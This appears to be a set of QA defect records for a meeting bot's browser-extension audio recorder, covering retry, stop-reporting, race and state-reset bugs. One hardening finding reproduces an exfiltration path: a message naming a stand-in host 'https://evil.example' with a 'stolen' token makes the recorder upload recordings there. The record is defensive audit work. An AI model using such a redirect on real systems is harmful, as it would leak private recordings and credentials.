title: recorder.js keeps sending chunks queued behind a chunk that exhausted its retries
evidence: `.catch(fail)` converts the rejection into a resolved promise, so the next queued chunk still runs after fail(). Reproduction (recorder.test.mjs, todo ISS-T034EXT-001): fake receiver throws for seq=0 only; emit chunks A,B -> seq 0 attempted 3x, then seq 1 is sent anyway (distinct seqs sent: [0,1]). The shipped receiver (tab-browser.ts:100-101) answers 409 for a non-consecutive seq, so no silent gap is stored today; the extension relies on the receiver for gap safety.
fix_direction: After failed=true, skip queued sends (check `failed` inside the queue callback), or rethrow so the chain stops.
checker_rerate: checker cycle 0: stays low. Receiver answers 409 for any seq != nextSequence (tab-browser.ts:101), so the later chunk is refused and no gapped file is written; consequence is wasted retries only.

title: An unexpectedly ended capture track reports capture-stopped failed:false (indistinguishable from a normal stop)
evidence: recorder.test.mjs: end an audio track mid-recording -> events end with {event:'capture-stopped', failed:false}, no capture-error. If the audio track dies while the meeting is still running, the receiver sees a clean finish and a silent truncation. Closing the tab is the intended clean end, but the code cannot tell the two apart.
fix_direction: Report a distinct reason (e.g. capture-stopped with reason:'track-ended') or have the receiver confirm the meeting actually ended before treating it as clean.
checker_rerate: checker cycle 0: stays medium (not high). Receiver tab-browser.ts:184 sets run.stopped on any capture-stopped; stop() then ends with state stopped and no throw if bytes>0, so the truncated file is accepted. Mitigation: the level meter timer is cleared on stop, so the T-031 audio watchdog sees no levels and alerts after 120 s; it is detection, not prevention.

title: recorder.js start() double-start guard is racy: `if (recorder)` is checked before the awaits that assign it
evidence: Two start messages delivered in the same tick -> navigator.mediaDevices.getUserMedia called twice (actual 2, expected 1). background.js's `starting` flag and getCapturedTabs check make this unreachable through the action click today.
fix_direction: Set a module-level `starting` flag synchronously at the top of start().

title: The offscreen recorder never resets state: a second capture in the same offscreen document is refused
area: packages/meeting-bot/py/tab-capture/recorder.js (recorder, sequence, failed, finishing never reset) + background.js (reuses an existing offscreen document)
evidence: Start, stop, then send start again -> {ok:false, error:'A capture is already active'}. Today a managed Chrome is launched per capture (inferred from tab-browser.ts), so it is not hit; a long-lived browser serving the T-038 scheduler or two meetings in a row would be.
fix_direction: Reset module state in onstop, or close the offscreen document after a capture.

title: Defence in depth: the recorder's onMessage handler ignores `sender` and trusts message.config.endpoint/token without a loopback check
evidence: A start message with sender {id:'other-extension', url:'https://evil.example/p.html'} is accepted (reply ok:true); a start message with config {endpoint:'https://evil.example', token:'stolen'} starts a capture that POSTs chunks and events to evil.example. NOT classed HIGH because it is unreachable today: manifest.json has no externally_connectable, content_scripts or web_accessible_resources and background.js registers no onMessage/onMessageExternal/onConnect, so Chrome never delivers a web page's or another extension's message to this handler; only this extension's own pages can send it. Any future content script or externally_connectable entry would turn this into an exfiltration path.
fix_direction: Reject when sender.id !== chrome.runtime.id or sender.url is not this extension's own origin; require config.endpoint to match ^http://127.0.0.1:\d+$.
regression_check: Fixed at 709038c (ownSender + 127.0.0.1 endpoint pin); residual fail-open edges closed at 93649ba. Checker verdict qa/verdicts/iss-t034ext-005-recorder-message-sender-check.md PASS cycle 0: the row's 2 recorded reproductions replayed verbatim from the row, 2/2 refused; 37 tests 36 pass 0 fail 1 todo; 6/6 own mutations killed. NOT exercised in a real browser (fake chrome.runtime).
checker_rerate: checker cycle 0: low->medium as a HARDENING item (security class: credential handling + recording upload target; never capped). Exploitability stays LOW/unreachable today: no externally_connectable, content_scripts, web_accessible_resources or scripting permission; no window message listener; config.json is written by the launcher into the unpacked extension dir (mode 0600), not passed via URL; the receiver additionally requires Origin chrome-extension://[a-p]{32} and the 32-byte bearer token. Fix needs an edit to recorder.js, which t052-executable-registration hash-freezes only for background.js and manifest.json (recorder.js is NOT in that freeze list as the maker states; Approver to confirm sequencing).

title: A capture-stopped {failed:true} that arrives without its preceding capture-error is accepted as a successful recording
evidence: recorder.js fail() posts capture-error with .catch(() => {}), then stop() -> onstop posts capture-stopped {failed}. The receiver ignores the failed field: it only does run.stopped = true; failure comes solely from capture-error. Reproduced in the harness: chunk send throws 'blip' x3, the capture-error POST throws, the later capture-stopped POST succeeds -> events as seen by a receiver that only got the successful call: [capture-started, capture-stopped{failed:true}]. stop() then finds run.failure unset and bytes>0, writes state 'stopped' and does not throw: a recording missing its tail chunks is treated as good. Window needs a receiver blip spanning the retries and the error POST yet recovering before the stopped POST (loopback: rare).
fix_direction: Receiver: treat capture-stopped with failed===true as a failure (set run.failure). Extension: retry the capture-error POST or fold the failure into capture-stopped.
